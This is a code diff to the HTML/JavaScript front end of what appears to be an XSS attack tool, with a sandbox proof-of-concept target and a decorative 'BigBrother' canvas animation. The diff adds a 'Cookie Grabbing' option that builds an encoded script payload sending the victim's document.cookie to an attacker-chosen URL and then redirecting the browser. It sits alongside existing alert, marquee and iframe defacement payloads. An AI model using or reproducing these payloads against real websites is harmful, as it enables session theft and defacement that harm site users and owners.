@@ -19,9 +19,10 @@ a {
 var alertbox = "<BODY ONLOAD=alert('1')>";
 var marquee = "<marquee>0wned!</marquee>";
 var cookie = "<ScRIPt>alert(document.cookie);<\/ScRiPt>";
-var iframe = "<iFrAmE src='../images/pwned.jpg' scrolling=no frameborder=0 width='1024' height='576'><\/iFrAmE>";
+var iframe = "<iFrAmE src='../images/pwned.jpg' scrolling=no frameborder=0 width='812' height='576'><\/iFrAmE>";
 window.onload = function() {
     document.getElementById('use_custom').style.display = 'none';
+    document.getElementById('cookie_grab_script_div').style.display = 'none';
     document.getElementById('get_poc').style.display = 'block';
     document.getElementById('post_poc').style.display = 'none';
 }
@@ -40,6 +41,7 @@ function SetMethod(frm){
 function SetScenario(frm){
 prefix = frm.prefix.value;
 custom_value = frm.custom_injection.value;
+cookie_grab_script=frm.cookie_grab_script.value;
   if (frm.target.value == ""){
      alert("Hey! Where is your target?")
      return false;
@@ -65,6 +67,10 @@ custom_value = frm.custom_injection.value;
      if(document.getElementById('custom').checked) {
      document.getElementById('lulz').value=prefix+custom_value;
      }
+     if(document.getElementById('cookie_grab').checked){ 
+     document.getElementById('lulz').value=prefix+unescape("%3CScRiPt%3Edocument.write%28%22%3Cimg%20src=%27")+cookie_grab_script+unescape("?%22%2bescape%28document.cookie%29%2b%22%27%3E%22%29")+";document.location='http://google.com';"+unescape("%3c%2FScRiPt%3E");
+
+     }
      document.poc.submit();
 }
 function SetHook(frm){
@@ -72,6 +78,7 @@ target = frm.target.value;
 vulnerability = frm.vulnerability.value;
 prefix = frm.prefix.value;
 custom_value = frm.custom_injection.value;
+custom_cookie_url = frm.cookie_grab_script.value;
   if (target == ""){
      alert("Hey! Where is your target?")
      return false;
@@ -89,6 +96,9 @@ custom_value = frm.custom_injection.value;
      if(document.getElementById('cookie').checked) {
      injection = prefix+cookie;
      }
+     if(document.getElementById('cookie_grab').checked) {
+     injection = prefix+unescape("%3CScRiPt%3Edocument.write%28%22%3Cimg%20src=%27")+custom_cookie_url+unescape("?%22%2bescape%28document.cookie%29%2b%22%27%3E%22%29")+";document.location='http://google.com';"+unescape("%3C%2FScRiPt%3E");
+     }
      if(document.getElementById('iframe').checked) {
      injection = prefix+iframe;
      }
@@ -100,16 +110,18 @@ custom_value = frm.custom_injection.value;
      document.poc.submit();
 }
 function SetScript(frm) {
+	document.getElementById('use_custom').style.display = 'none';
+	document.getElementById('cookie_grab_script_div').style.display = 'none';
+        document.getElementById('line1').style.display = 'none';
     if (document.getElementById('custom').checked) {
         document.getElementById('use_custom').style.display = 'block';
         document.getElementById('line1').style.display = 'block';
+    }else if (document.getElementById('cookie_grab').checked) {
+        document.getElementById('cookie_grab_script_div').style.display = 'block';
+        document.getElementById('line1').style.display = 'block';
     }
-    else if (!document.getElementById('custom').checked) {
-        document.getElementById('use_custom').style.display = 'none';
-        document.getElementById('line1').style.display = 'none';
-   }
 }
-function LoadPoc(m,target,vuln,prefix){
+function LoadPoc(m,target,vuln,prefix,cook_grab_scr){
 	if(m=="GET"){
 		document.getElementById("get").checked=true;
 	}else{
@@ -118,53 +130,79 @@ function LoadPoc(m,target,vuln,prefix){
 	document.getElementById("target").value=target;
 	document.getElementById("vulnerability").value=vuln;
 	document.getElementById("prefix").value=unescape(prefix);
+	document.getElementById("cookie_grab_script").value=cook_grab_scr;
 }
+var cans=Array();
 var frame=0;
+var vStickLength=0.6*(-5+18*Math.random());
+var vStickWidth=0.5+5*Math.random();
+var vIncX=Math.random()*80+20;
+var blocks=Array();
 function Egg(){
-    	window.scrollBy(0,50); // horizontal and vertical scroll increments
-    	scrolldelay = setTimeout('pageScroll()',100); // scrolls every 100 milliseconds
+        window.scrollBy(0,100);
 	var canvas = document.createElement('canvas');
 	canvas.id = "CursorLayer";
-	canvas.width  = 298;
-	canvas.height = 96;
-	canvas.style.zIndex   = -2;
-	canvas.style.position = "absolute";
-	canvas.style.padding=5;
+	canvas.width  = 250;
+	canvas.height = 46;
+	canvas.style.zIndex = -2;
+	canvas.style.position = "relative";
+	canvas.style.padding = 5;
 	canvas.style.top = 0; 
 	canvas.style.border = "1px solid";
-	canvas.style.background = "red";
 	var context = canvas.getContext('2d');
+	if(frame<55){
+	canvas.style.background = 'rgba('+parseInt(Math.random()*8+30)+','+parseInt(Math.random()*8+30)+','+parseInt(100+Math.random()*155)+',1)';
 	context.font = 'italic 20pt Calibri';
-	context.fillText('BigBrother!!!', 50, 50);
-	document.body.appendChild(canvas);
+	context.fillStyle='rgba('+parseInt(Math.random()*25)+','+parseInt(Math.random()*25)+','+parseInt(Math.random()*25)+',1)';
+	context.fillText('BigBrother!!!', 20, 30);
+	}else{
+	canvas.style.background = 'lime';
+        context.font = 'italic 20pt Courier';
+        context.fillStyle='black';
+	luck=Array("Remember","Use", "Squat", "Think", "Mayh3m!", "Hell!", "Destroy", "Fight", "Big Brother!", "Shit", "The", "Crypto", "Anarchy", "Truth", "Out", "Ilegal", "Hack", "CCTV", "XSS", "Satellite", "SlaveMaster", "Money", "Bitcoin", "Will be")
+        context.fillText(luck[parseInt(luck.length*Math.random())], 20, 30);
+	}
+	if(frame<60) {
+		b=document.body.appendChild(canvas);
+		if(frame<60) blocks.push(b);
+	}else{
+		if(typeof blocks[frame-60]!="undefined") blocks[frame-60].style.display="none";
+	}
 	var canvas = document.createElement('canvas');
-	canvas.style.zIndex   = -1;
-	canvas.style.background = "rgba(0,0,0,0)";
-	canvas.width = 408;
+	canvas.style.zIndex   = -666;
+	canvas.width = 360;
 	canvas.height = 598;
+	canvas.style.position = "fixed";
+        canvas.style.left=((frame*vIncX)%1024)+"px";
+	canvas.style.top="10px";
+	cans[frame]=canvas;
 	document.body.appendChild(canvas);
 	var ctx = canvas.getContext('2d');
-	ctx.moveTo(200,200);
-	for(i=0;i<10;i++){
-	ctx.strokeStyle = '#00ff00';
-	ctx.lineTo(200+100*Math.random(),100+500*Math.random());
-	ctx.stroke();
-	ctx.strokeStyle='#fffff0';
+	ctx.moveTo(-15+Math.random(50),20);
+	for(i=0;i<5;i++){
+	ctx.strokeStyle = 'rgba('+parseInt(Math.random()*255)+','+parseInt(Math.random()*255)+','+parseInt(Math.random()*255)+',0.1)';
+	ctx.lineWidth=3;
+	ctx.strokeStyle='rgba('+parseInt(Math.random()*255)+','+parseInt(Math.random()*255)+','+parseInt(Math.random()*255)+',0.4)';
         ctx.beginPath();
-	cx=200+100*Math.random();
+	cx=60+100*Math.random();
 	cy=50+400*Math.random();
-      	ctx.arc(cx,cy, i*4, 0, 2 * Math.PI, false);
+      	ctx.arc(cx,cy, i*8.5, 0, 2 * Math.PI, false);
 	ctx.fill();
-	ctx.stroke();
-	ctx.strokeStyle='#ffff00';
-	ctx.fillStyle = 'rgba(0,0,0,0.5)';
-	ctx.arc(cx*1.2,cy*1.2, i*3, 0, 2 * Math.PI, false);
+	ctx.strokeStyle='rgba('+parseInt(Math.random()*255)+','+parseInt(Math.random()*255)+','+parseInt(Math.random()*255)+',0.1)';
+	ctx.fillStyle = 'rgba('+parseInt(Math.random()*255)+','+parseInt(Math.random()*255)+','+parseInt(Math.random()*255)+',0.1)';
+	ctx.arc(cx*vStickWidth,cy*vStickLength, i*2.5, 0, 2 * Math.PI, false);
         ctx.fill();
-        ctx.lineWidth = i/2;
+        ctx.lineWidth = i/6;
         ctx.strokeStyle = '#aa3300';
-        ctx.stroke();
+	if(!(frame%5)){
+		for(j=0;j<=cans.length;j++){
+			if(typeof cans[j] === 'undefined') continue;
+			ctx=cans[j].getContext("2d");
+			ctx.strokeStyle = 'rgba('+parseInt(Math.random()*255)+','+parseInt(Math.random()*255)+','+parseInt(Math.random()*255)+',1)';
+		}
+	}
 }
-setTimeout('Egg()', 500);
+setTimeout('Egg()', 200);
 frame++;
 }
 </script>
@@ -188,9 +226,9 @@ frame++;
  </tr>
  <tr>
  <td colspan=2>
-<hr>
-<label id="get_poc"><b>PoC</b> -> Target: <i>sandbox/search.php</i> -> Vuln.: <i>search_text</i> -> Vector: <i>"></i> | <a href="sandbox/get.html" target="_blank">SandBoX (HTTP-GET)</a> | <a onClick="javascript:LoadPoc('GET','sandbox/search.php','search_text','%22>')" href=#>Load PoC</a></label>
-<label id="post_poc"><b>PoC</b> -> Target: <i>sandbox/search.php</i> -> Vuln.: <i>search_text</i> -> Vector: <i>"></i> | <a href="sandbox/post.html" target="_blank">SandBoX (HTTP-POST)</a> | <a onClick="javascript:LoadPoc('POST','sandbox/search.php','search_text','%22>')" href=#>Load PoC</a></label>
+<hr><script>var l=""+document.location;l=l.replace(/(.*)\/.*/,"$1/home.php")</script>
+<label id="get_poc"><b>PoC</b> -> Target: <i>sandbox/search.php</i> -> Vuln.: <i>search_text</i> -> Vector: <i>"></i> | <a href="sandbox/get.html" target="_blank">SandBoX (HTTP-GET)</a> | <a onClick="javascript:LoadPoc('GET','sandbox/search.php','search_text','%22>',l)" href=#>Load PoC</a></label>
+<label id="post_poc"><b>PoC</b> -> Target: <i>sandbox/search.php</i> -> Vuln.: <i>search_text</i> -> Vector: <i>"></i> | <a href="sandbox/post.html" target="_blank">SandBoX (HTTP-POST)</a> | <a onClick="javascript:LoadPoc('POST','sandbox/search.php','search_text','%22>',l)" href=#>Load PoC</a></label>
 <hr>
 </td>
  </tr>
@@ -207,16 +245,20 @@ frame++;
 <hr>
 <table border="1" cellpadding="6" cellspacing="6">
  <tr>
-  <td>JS AlertBox</td><td> <input type="radio" name="exploit" id="alertbox" onclick="javascript:SetScript();" checked></td>
-  <td>Cookie Grabbing</td><td> <input type="radio" name="exploit" id="cookie" onclick="javascript:SetScript();" /></td>
+  <td>JS Alert</td><td> <input type="radio" name="exploit" id="alertbox" onclick="javascript:SetScript();" checked></td>
+  <td>Cookie Popup</td><td> <input type="radio" name="exploit" id="cookie" onclick="javascript:SetScript();" /></td>
   <td>HTML Marquee</td><td> <input type="radio" name="exploit" id="marquee" onclick="javascript:SetScript();" /></td>
+  <td>Cookie Grabbing</td><td> <input type="radio" name="exploit" id="cookie_grab" onclick="javascript:SetScript();" /></td>
   <td>Defacement</td><td> <input type="radio" name="exploit" id="iframe" onclick="javascript:SetScript();" /></td>
   <td>Custom Script</td><td> <input type="radio" name="exploit" id="custom" onclick="javascript:SetScript();" /></td>
  </tr>
 </table>
 <hr id="line1" style="display:none">
 <div id="use_custom" style="display:none">
- <input type="text" name="custom_injection" size="92">
+ Custom injection: <input type="text" name="custom_injection" size="92">
+</div>
+<div id="cookie_grab_script_div" style="display:none">
+ Grabbing URL: <input type="text" id="cookie_grab_script" name="cookie_grab_script" size="92">
 </div>
 <hr>
   <input type="hidden" id="lulz"></input>
@@ -228,6 +270,5 @@ frame++;
  </tr>
 </table>
 </form>
-
 </body>
 </html>
